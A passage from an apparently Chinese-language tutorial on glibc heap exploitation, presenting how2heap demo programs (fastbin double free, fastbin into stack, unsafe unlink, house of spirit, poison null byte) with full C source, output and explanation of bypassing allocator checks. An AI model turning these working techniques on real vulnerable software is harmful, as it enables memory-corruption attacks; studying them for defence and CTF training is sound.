输出： 123456789101112131415161718This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.glibc uses a first-fit algorithm to select a free chunk.If a chunk is free and large enough, malloc will select this chunk.This can be exploited in a use-after-free situation.Allocating 2 buffers. They can be large, don't have to be fastbin.1st malloc(0x512): 0x121f0102nd malloc(0x256): 0x121f530we could continue mallocing here...now let's put a string at a that we can read later &quot;this is A!&quot;first allocation 0x121f010 points to this is A!Freeing the first one...We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010So, let's allocate 0x500 bytes3rd malloc(0x500): 0x121f010And put a different string here, &quot;this is C!&quot;3rd allocation 0x121f010 points to this is C!first allocation 0x121f010 points to this is C!If we reuse the first allocation, it now holds the data from the third allocation. 这个例子很简单，由于初始分配给a的0x512字节刚刚被释放，此时分配一块小于0x512字节的内存必定会使用刚才a使用的内存区域。注意如果最后使用被释放的指针a，那么它仍然指向this is C!字符串，这就是通常说的use after free。 fastbin_dup源码： 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates a simple double-free attack with fastbins.\\n&quot;); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we'll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it's not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\\n&quot;, a, b, a, a); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, malloc(8));} 输出： 12345678910111213This file demonstrates a simple double-free attack with fastbins.Allocating 3 buffers.1st malloc(8): 0x17e90102nd malloc(8): 0x17e90303rd malloc(8): 0x17e9050Freeing the first one...If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list.So, instead, we'll free 0x17e9030.Now, we can free 0x17e9010 again, since it's not the head of the free list.Now the free list has [ 0x17e9010, 0x17e9030, 0x17e9010 ]. If we malloc 3 times, we'll get 0x17e9010 twice!1st malloc(8): 0x17e90102nd malloc(8): 0x17e90303rd malloc(8): 0x17e9010 这里如果释放a后再释放它一次，由于它位于 freelist 顶端过不了安全检查，得到： 1*** Error in `./a.out': double free or corruption (fasttop): 0x00000000007aa010 *** 这就是我们说的double free。然而我们第一次释放a后如果先释放另一个块b，那么b就会位于 freelist 顶部，此时再次释放a就可以绕过double free的检测。这样做的结果是最后第一次和第三次malloc得到的两个不同指针指向了相同的地址。 fastbin_dup_into_stack源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\\n&quot; &quot;returning a pointer to a controlled location (in this case, the stack).\\n&quot;); unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we'll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it's not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot; &quot;We'll now carry out our attack by modifying data at %p.\\n&quot;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\\n&quot; &quot;return a pointer to it.\\n&quot;, a); stack_var = 0x20; fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\\n&quot;, malloc(8)); fprintf(stderr, &quot;4th malloc(8): %p\\n&quot;, malloc(8));} 输出： 12345678910111213141516171819202122This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7ffe1610b248.Allocating 3 buffers.1st malloc(8): 0x1e3a0102nd malloc(8): 0x1e3a0303rd malloc(8): 0x1e3a050Freeing the first one...If we free 0x1e3a010 again, things will crash because 0x1e3a010 is at the top of the free list.So, instead, we'll free 0x1e3a030.Now, we can free 0x1e3a010 again, since it's not the head of the free list.Now the free list has [ 0x1e3a010, 0x1e3a030, 0x1e3a010 ]. We'll now carry out our attack by modifying data at 0x1e3a010.1st malloc(8): 0x1e3a0102nd malloc(8): 0x1e3a030Now the free list has [ 0x1e3a010 ].Now, we have access to 0x1e3a010 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x1e3a010 to point right before the 0x20.3rd malloc(8): 0x1e3a010, putting the stack address on the free list4th malloc(8): 0x7ffe1610b248 这里利用上一个例子的double free漏洞，来让malloc返回一个任意地址（并不一定是栈上地址），从而实现任意地址读写。首先还是以a-&gt;b-&gt;a的顺序释放内存，随后两次malloc使得d指向原来a指向的地址0x1e3a010，并且 freelist 里只剩一个0x1e3a010。 现在修改栈上变量stack_var的值为0x20，这是为了伪造chunk_size头部让malloc以为这个地方有一个 chunk。这还不够，我们还需要让这个 chunk 被认为是空闲的，也就是要把它加入 freelist 中。 怎么做呢？我们知道，对于一个空闲 chunk 来说，chunk_size下面就是fd，存放下一个空闲 chunk 的地址。而malloc返回给用户的指针mem（在这个例子中，0x1e3a010）恰好指向chunk_size的结尾处，也就是fd开始位置。现在我们拥有d指针，也就能修改这个位置的值让它指向stack_var的前一个栈单元（这里是向前 8 字节），这里就是这个伪造 chunk 的chunk指针。这样一来，当我们进行3rd malloc(8)时，该chunk指针就会进入 freelist 里，最后malloc的时候就会返回这个伪造 chunk 的mem指针。 注意栈从高地址向低地址生长，堆反过来，所以源码一开始是8+(char *)&amp;stack_var，而最后是((char*)&amp;stack_var) - sizeof(d)。 fastbin_dup_consolidate源码： 12345678910111213141516171819#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;int main() { void* p1 = malloc(0x40); void* p2 = malloc(0x40); fprintf(stderr, &quot;Allocated two fastbins: p1=%p p2=%p\\n&quot;, p1, p2); fprintf(stderr, &quot;Now free p1!\\n&quot;); free(p1); void* p3 = malloc(0x400); fprintf(stderr, &quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\\n&quot;, p3); fprintf(stderr, &quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\\n&quot;); free(p1); fprintf(stderr, &quot;Trigger the double free vulnerability!\\n&quot;); fprintf(stderr, &quot;We can pass the check in malloc() since p1 is not fast top.\\n&quot;); fprintf(stderr, &quot;Now p1 is in unsorted bin and fast bin. So we'will get it twice: %p %p\\n&quot;, malloc(0x40), malloc(0x40));} 输出： 1234567Allocated two fastbins: p1=0x1af0010 p2=0x1af0060Now free p1!Allocated large bin to trigger malloc_consolidate(): p3=0x1af00b0In malloc_consolidate(), p1 is moved to the unsorted bin.Trigger the double free vulnerability!We can pass the check in malloc() since p1 is not fast top.Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x1af0010 0x1af0010 首先分配了两个0x40的chunk，实际大小为0x50。需要p2是为了之后释放p1时不会和top chunk合并。随后释放其中一个并申请0x400的chunk，这时会尝试从unsorted bin中切割，但是空间不足，触发了malloc_consolidate，使得fastbin中的p1进入unsorted bin（实际上，如果此时有多个连续chunk在fastbin中，会先合并）中。 这个时候，fastbin链表头部没有p1了，所以我们再次free(p1)就可以成功，造成double free。现在fastbin和unsorted bin中都有p1了，我们可以两次malloc()拿到两个同样的指针。 unsafe_unlink源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;uint64_t *chunk0_ptr;int main(){ fprintf(stderr, &quot;Welcome to unsafe unlink 2.0!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04/16.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have a pointer at a known location to a region you can call unlink on.\\n&quot;); fprintf(stderr, &quot;The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\\n&quot;); int malloc_size = 0x80; //we want to be big enough not to use fastbins int header_size = 2; fprintf(stderr, &quot;The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\\n\\n&quot;); chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0 uint64_t *chunk1_ptr = (uint64_t*) malloc(malloc_size); //chunk1 fprintf(stderr, &quot;The global chunk0_ptr is at %p, pointing to %p\\n&quot;, &amp;chunk0_ptr, chunk0_ptr); fprintf(stderr, &quot;The victim chunk we are going to corrupt is at %p\\n\\n&quot;, chunk1_ptr); fprintf(stderr, &quot;We create a fake chunk inside chunk0.\\n&quot;); fprintf(stderr, &quot;We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.\\n&quot;); chunk0_ptr[2] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*3); fprintf(stderr, &quot;We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.\\n&quot;); fprintf(stderr, &quot;With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == False\\n&quot;); chunk0_ptr[3] = (uint64_t) &amp;chunk0_ptr-(sizeof(uint64_t)*2); fprintf(stderr, &quot;Fake chunk fd: %p\\n&quot;,(void*) chunk0_ptr[2]); fprintf(stderr, &quot;Fake chunk bk: %p\\n\\n&quot;,(void*) chunk0_ptr[3]); fprintf(stderr, &quot;We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\\n&quot;); uint64_t *chunk1_hdr = chunk1_ptr - header_size; fprintf(stderr, &quot;We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\\n&quot;); fprintf(stderr, &quot;It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\\n&quot;); chunk1_hdr[0] = malloc_size; fprintf(stderr, &quot;If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\\n&quot;,(void*)chunk1_hdr[0]); fprintf(stderr, &quot;We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\\n\\n&quot;); chunk1_hdr[1] &amp;= ~1; fprintf(stderr, &quot;Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\\n&quot;); fprintf(stderr, &quot;You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\\n\\n&quot;); free(chunk1_ptr); fprintf(stderr, &quot;At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\\n&quot;); char victim_string[8]; strcpy(victim_string,&quot;Hello!~&quot;); chunk0_ptr[3] = (uint64_t) victim_string; fprintf(stderr, &quot;chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\\n&quot;); fprintf(stderr, &quot;Original value: %s\\n&quot;,victim_string); chunk0_ptr[0] = 0x4141414142424242LL; fprintf(stderr, &quot;New Value: %s\\n&quot;,victim_string);} 输出： 1234567891011121314151617181920212223242526272829Welcome to unsafe unlink 2.0!Tested in Ubuntu 14.04/16.04 64bit.This technique can be used when you have a pointer at a known location to a region you can call unlink on.The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.The global chunk0_ptr is at 0x602070, pointing to 0x23ed010The victim chunk we are going to corrupt is at 0x23ed0a0We create a fake chunk inside chunk0.We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;fd-&gt;bk = P.We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &amp;chunk0_ptr so that P-&gt;bk-&gt;fd = P.With this setup we can pass this check: (P-&gt;fd-&gt;bk != P || P-&gt;bk-&gt;fd != P) == FalseFake chunk fd: 0x602058Fake chunk bk: 0x602060We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordinglyIf we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.Original value: Hello!~New Value: BBBBAAAA 利用unlink漏洞一般需要堆溢出以及全局指针变量。在这个例子里全局指针变量就是chunk0的mem指针，chunk0中存在堆溢出，可以溢出到chunk1。 我们首先看一下unlink这个宏，它被用来从bin中删除chunk： 12345678910111213141516171819202122232425262728293031#define unlink(AV, P, BK, FD) { \\ FD = P-&gt;fd; \\ BK = P-&gt;bk; \\ if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV); \\ else { \\ FD-&gt;bk = BK; \\ BK-&gt;fd = FD; \\ if (!in_smallbin_range (P-&gt;size) \\ &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) { \\ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ &quot;corrupted double-linked list (not small)&quot;, \\ P, AV); \\ if (FD-&gt;fd_nextsize == NULL) { \\ if (P-&gt;fd_nextsize == P) \\ FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD; \\ else { \\ FD-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ FD-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;fd_nextsize-&gt;bk_nextsize = FD; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = FD; \\ } \\ } else { \\ P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize; \\ P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize; \\ } \\ } \\ } \\} 可以先忽略下面和large bin相关的部分，关注开头：首先要求满足两个条件： (P-&gt;fd)-&gt;bk == P (P-&gt;bk)-&gt;fd == P 如果满足，则执行： 12(P-&gt;fd)-&gt;bk = P-&gt;bk(P-&gt;bk)-&gt;fd = P-&gt;fd 这就是普通的双向链表删除结点的操作，不安全的地方在于上面的检查，我们可以伪造堆块来绕过这个检查。 我们在chunk0里伪造chunk。对于chunk0_ptr，我们预留0x10空间给伪chunk的prev_size和chunk_size字段，此时chunk0_ptr就是fake_chunk的chunk指针。那么其fd实际上就是*(chunk0_ptr + 2)，其bk实际上就是*(chunk0_ptr + 3)。用_0后缀表示属于chunk0的字段，_f表示属于伪造chunk的字段（从左至右、从下至上为低地址到高地址）： 1234567891011 ---------------------------- &lt;- chunk1_ptr| prev_size_1 | chunk_size_1 | ----------------------------| data | ----------------------------| fd_f | bk_f | ----------------------------| prev_size_f | chunk_size_f | ---------------------------- &lt;- chunk0_ptr| prev_size_0 | chunk_size_0 | ---------------------------- 如果我们让伪造的fd指向&amp;chunk0_ptr - 0x18（0x8一个单位，即三个单位），那么要找到(fake_chunk-&gt;fd)-&gt;bk，就需要计算(&amp;chunk0_ptr - 0x18) + 0x18 = &amp;chunk0_ptr，这就回到了fake_chunk的chunk指针上，满足了第一个条件。 同理，让伪造的bk指向&amp;chunk0_ptr - 0x10，那么它的fd就需要把0x10加回来，同样回到了fake_chunk的chunk指针。这样就绕过了unlink的检查。 现在，由于存在堆溢出，我们将chunk1的prev_size写成我们fake_chunk的大小。在例子里chunk0大小为0x90，而fake_chunk为0x80。然后把chunk1的PREV_IN_USE位置为0，这样以后再free(chunk1)，此时分配器就会认为前面有一个空闲的大小为0x80的chunk，也就是我们的fake chunk，然后触发unlink(fake_chunk)来尝试与chunk1合并。 问题在于，我们从头到尾都没有真正释放过fake chunk，因此它不可能出现在任何bin里，而unlink却尝试把它从bin里拆出来。这时执行链表删除操作，但由于(P-&gt;fd)-&gt;bk和(P-&gt;bk)-&gt;fd是相同的，只有后一句有意义，此时相当于执行了chunk0_ptr = &amp;chunk0_ptr - 0x18。 123456789 ------------------| &amp;chunk0_ptr-0x18 |--- ------------------ || ? | | ------------------ || ? | | ------------------ &lt;---| ? | ------------------ 那么同理，如果我们修改*(chunk0_ptr + 3)的值为Hello!~，实际上就等于令chunk0_ptr指向Hello!~，此时修改*chunk0_ptr，那么Hello!~字符串就被覆盖了。 house_of_spirit源码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates the house of spirit attack.\\n&quot;); fprintf(stderr, &quot;Calling malloc() once so that it sets up its memory.\\n&quot;); malloc(1); fprintf(stderr, &quot;We will now overwrite a pointer to point to a fake 'fastbin' region.\\n&quot;); unsigned long long *a; // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY) unsigned long long fake_chunks[10] __attribute__ ((aligned (16))); fprintf(stderr, &quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\\n&quot;, sizeof(fake_chunks), &amp;fake_chunks[1], &amp;fake_chunks[9]); fprintf(stderr, &quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\\n&quot;); fprintf(stderr, &quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \\n&quot;); fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\\n&quot;); // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8 fake_chunks[9] = 0x1234; // nextsize fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\\n&quot;, malloc(0x30));} 输出： 123456789101112This file demonstrates the house of spirit attack.Calling malloc() once so that it sets up its memory.We will now overwrite a pointer to point to a fake 'fastbin' region.This region (memory of length: 80) contains two chunks. The first starts at 0x7ffcdc8eeb88 and the second at 0x7ffcdc8eebc8.This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffcdc8eeb88.... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.Freeing the overwritten pointer.Now the next malloc will return the region of our fake chunk at 0x7ffcdc8eeb88, which will be 0x7ffcdc8eeb90!malloc(0x30): 0x7ffcdc8eeb90 这个比较简单，在fake_chunks数组里伪造了fastbin大小的chunk，确保当前chunk_size和nextsize合法后，把fake chunk的mem指针地址给指针a，然后free(a)，这样就使得fake chunk进入了fastbin，下次malloc就会返回这个mem指针。 这里的合法是指： chunk_size的IS_MMAPED为0 chunk_size属于fastbin范围内 nextsize大于2*SIZE_SZ，小于system_mem poison_null_byte源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;int main(){ fprintf(stderr, &quot;Welcome to poison null byte 2.0!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 14.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n&quot;); uint8_t* a; uint8_t* b; uint8_t* c; uint8_t* b1; uint8_t* b2; uint8_t* d; void *barrier; fprintf(stderr, &quot;We allocate 0x100 bytes for 'a'.\\n&quot;); a = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;a: %p\\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow 'a', we need to know the 'real' size of 'a' &quot; &quot;(it may be more than 0x100 because of rounding): %#x\\n&quot;, real_a_size); /* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0x200); fprintf(stderr, &quot;b: %p\\n&quot;, b); c = (uint8_t*) malloc(0x100); fprintf(stderr, &quot;c: %p\\n&quot;, c); barrier = malloc(0x100); fprintf(stderr, &quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\\n&quot; &quot;The barrier is not strictly necessary, but makes things less confusing\\n&quot;, barrier); uint64_t* b_size_ptr = (uint64_t*)(b - 8); // added fix for size==prev_size(next_chunk) check in newer versions of glibc // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30 // this added check requires we are allowed to have null pointers in b (not just a c string) //*(size_t*)(b+0x1f0) = 0x200; fprintf(stderr, &quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot; &quot;the check 'chunksize(P) != prev_size (next_chunk(P))'\\n&quot;); // we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00) // which is the value of b.size after its first byte has been overwritten with a NULL byte *(size_t*)(b+0x1f0) = 0x200; // this technique works by overwriting the size metadata of a free chunk free(b); fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x200 + 0x10) | prev_in_use\\n&quot;); fprintf(stderr, &quot;We overflow 'a' with a single null byte into the metadata of 'b'\\n&quot;); a[real_a_size] = 0; // &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot; fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2; fprintf(stderr, &quot;c.prev_size is %#lx\\n&quot;,*c_prev_size_ptr); // This malloc will result in a call to unlink on the chunk where b was. // The added check (commit id: 17f487b), if not properly handled as we did before, // will detect the heap corruption now. // The check is this: chunksize(P) != prev_size (next_chunk(P)) where // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow) // next_chunk(P) == b-0x10+0x200 == b+0x1f0 // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200 fprintf(stderr, &quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\\n&quot;, *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8)))); b1 = malloc(0x100); fprintf(stderr, &quot;b1: %p\\n&quot;,b1); fprintf(stderr, &quot;Now we malloc 'b1'. It will be placed where 'b' was. &quot; &quot;At this point c.prev_size should have been updated, but it was not: %#lx\\n&quot;,*c_prev_size_ptr); fprintf(stderr, &quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot; &quot;before c.prev_size: %lx\\n&quot;,*(((uint64_t*)c)-4)); fprintf(stderr, &quot;We malloc 'b2', our 'victim' chunk.\\n&quot;); // Typically b2 (the victim) will be a structure with valuable pointers that we want to control b2 = malloc(0x80); fprintf(stderr, &quot;b2: %p\\n&quot;,b2); memset(b2,'B',0x80); fprintf(stderr, &quot;Current b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\\n&quot;); free(b1); free(c); fprintf(stderr, &quot;Finally, we allocate 'd', overlapping 'b2'.\\n&quot;); d = malloc(0x300); fprintf(stderr, &quot;d: %p\\n&quot;,d); fprintf(stderr, &quot;Now 'd' and 'b2' overlap.\\n&quot;); memset(d,'D',0x300); fprintf(stderr, &quot;New b2 content:\\n%s\\n&quot;,b2); fprintf(stderr, &quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot; &quot;for the clear explanation of this technique.\\n&quot;);} 输出： 1234567891011121314151617181920212223242526272829303132Welcome to poison null byte 2.0!Tested in Ubuntu 14.04 64bit.This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.We allocate 0x100 bytes for 'a'.a: 0x19e6010Since we want to overflow 'a', we need to know the 'real' size of 'a' (it may be more than 0x100 because of rounding): 0x108b: 0x19e6120c: 0x19e6330We allocate a barrier at 0x19e6440, so that c is not consolidated with the top-chunk when freed.The barrier is not strictly necessary, but makes things less confusingIn newer versions of glibc we will need to have our updated size inside b itself to pass the check 'chunksize(P) != prev_size (next_chunk(P))'b.size: 0x211b.size is: (0x200 + 0x10) | prev_in_useWe overflow 'a' with a single null byte into the metadata of 'b'b.size: 0x200c.prev_size is 0x210We will pass the check since chunksize(P) == 0x200 == 0x200 == prev_size (next_chunk(P))b1: 0x19e6120Now we malloc 'b1'. It will be placed where 'b' was. At this point c.prev_size should have been updated, but it was not: 0x210Interestingly, the updated value of c.prev_size has been written 0x10 bytes before c.prev_size: f0We malloc 'b2', our 'victim' chunk.b2: 0x19e6230Current b2 content:BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBNow we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').Finally, we allocate 'd', overlapping 'b2'.d: 0x19e6120Now 'd' and 'b2' overlap.New b2 